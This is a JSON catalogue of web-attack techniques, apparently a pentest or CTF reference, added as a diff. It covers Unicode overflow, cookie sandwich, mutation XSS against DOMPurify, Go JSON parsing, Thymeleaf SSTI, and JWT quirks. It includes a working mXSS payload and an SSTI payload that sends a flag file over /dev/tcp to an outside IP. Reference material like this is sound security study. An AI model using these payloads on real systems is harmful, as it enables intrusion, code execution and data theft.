@@ -1,0 +1,128 @@
+[
+  {
+    "id": 1,
+    "name": "Unicode Overflow",
+    "tags": [
+      "blacklist character",
+      "bypass",
+      "unicode"
+    ],
+    "description": "Bypassing character blocklists with unicode overflows.\nUnicode codepoint truncation - also called a Unicode overflow attack - happens when a server tries to store a Unicode character in a single byte. Because the maximum value of a byte is 255, an overflow can be crafted to produce a specific ASCII character.",
+    "signatures": [
+      "String.fromCharCode"
+    ],
+    "conditions": [],
+    "payloads": [],
+    "references": [
+      "https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows"
+    ],
+    "examples": "",
+    "notes": ""
+  },
+  {
+    "id": 2,
+    "name": "Cookie Sandwich technique",
+    "tags": [
+      "xss",
+      "stealing cookie",
+      "httponly bypass"
+    ],
+    "description": "The cookie sandwich technique manipulates how web servers parse and handle cookies when special characters are used within them. By cleverly placing quotes and legacy cookies, an attacker can cause the server to misinterpret the structure of the cookie header, potentially exposing HttpOnly cookies to client-side scripts.",
+    "signatures": [
+      "httponly flag",
+      "cookie"
+    ],
+    "conditions": [],
+    "payloads": [],
+    "references": [
+      "https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique",
+      "https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie"
+    ],
+    "examples": "document.cookie = `$Version=1; domain=${domain}; path=${path};`;\ndocument.cookie = `${cookie}=\"deadbeef; domain=${domain}; path=${path};`;\ndocument.cookie = `dummy=qaz\"; domain=${domain}; path=/;`;",
+    "notes": "should have an xss and a reflected point"
+  },
+  {
+    "id": 3,
+    "name": "Mutation XSS",
+    "tags": [
+      "mxss",
+      "DOMPurify",
+      "html sanitization"
+    ],
+    "description": "Bypass DOMPurify or similar sanitization mechanism using mutation xss via namespace confusion",
+    "signatures": [
+      "html sanitization"
+    ],
+    "conditions": [],
+    "payloads": [
+      "<form><math><mtext></form><form><malignmark><style></math><img src onerror=alert(1)>"
+    ],
+    "references": [
+      "https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/"
+    ],
+    "examples": "",
+    "notes": "should have an xss"
+  },
+  {
+    "id": 4,
+    "name": "Exploit difference in parsing json Golang",
+    "tags": [
+      "parsing json",
+      "go"
+    ],
+    "description": "When a json is passed through different service, difference in json parsing rules can lead to manipulating the json key, value",
+    "signatures": [
+      "parsing json through different service/language"
+    ],
+    "conditions": [],
+    "payloads": [],
+    "references": [
+      "https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/"
+    ],
+    "examples": "",
+    "notes": "To unmarshal JSON into a struct, Unmarshal matches incoming object keys to the keys used by Marshal (either the struct field name or its tag), preferring an exact match but also accepting a case-insensitive match.\n ſ (the unicode character named Latin small letter long s) as an s, and K (the unicode character for the Kelvin sign) as a k"
+  },
+  {
+    "id": 5,
+    "name": "SSTI in Spring ThymeleafView Java",
+    "tags": [
+      "java",
+      "ssti",
+      "thymeleaf"
+    ],
+    "description": "User-controlled input is put into the view/template name leading to RCE",
+    "signatures": [
+      "thymeleaf",
+      "view engine",
+      "java"
+    ],
+    "conditions": [],
+    "payloads": [
+      "__${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('bash -c $@|bash 0 echo cat /app/flag.txt > /dev/tcp/10.10.1.3/3001')}__::.x"
+    ],
+    "references": [
+      "https://github.com/veracode-research/spring-view-manipulation",
+      "https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#spring-view-manipulation-java"
+    ],
+    "examples": "---Vulnerable code:---\n @GetMapping('/path') \npublic String path(@RequestParam String lang) {\nreturn 'user/' + lang + '/welcome';} \n\n ---Another vulnerable code--- @GetMapping('/doc/{document}') \n public void getDocument(@PathVariable String document) {log.info('Retrieving ' + document);}",
+    "notes": "If we take a deeper look into the documentation of the Thymeleaf template engine, we will find an interesting feature called expression preprocessing. Expressions placed between double underscores (__...__) are preprocessed and the result of the preprocessing is used as part of the expression during regular processing"
+  },
+  {
+    "id": 6,
+    "name": "Decoding the JWT Anomaly: When Changing a Token’s Last Character Doesn’t Break Verification",
+    "tags": [
+      "jwt"
+    ],
+    "description": "JWT (JSON Web Token) is widely used as a compact and URL-safe means of representing claims between two parties. But sometimes, peculiar behavior is observed: altering the last character of a JWT token doesn’t always render it invalid.",
+    "signatures": [
+      "jwt blocklist"
+    ],
+    "conditions": [],
+    "payloads": [],
+    "references": [
+      "https://medium.com/@mark_huber/decoding-the-jwt-anomaly-when-changing-a-tokens-last-character-doesn-t-break-verification-d6ab68627afb"
+    ],
+    "examples": "",
+    "notes": ""
+  }
+]
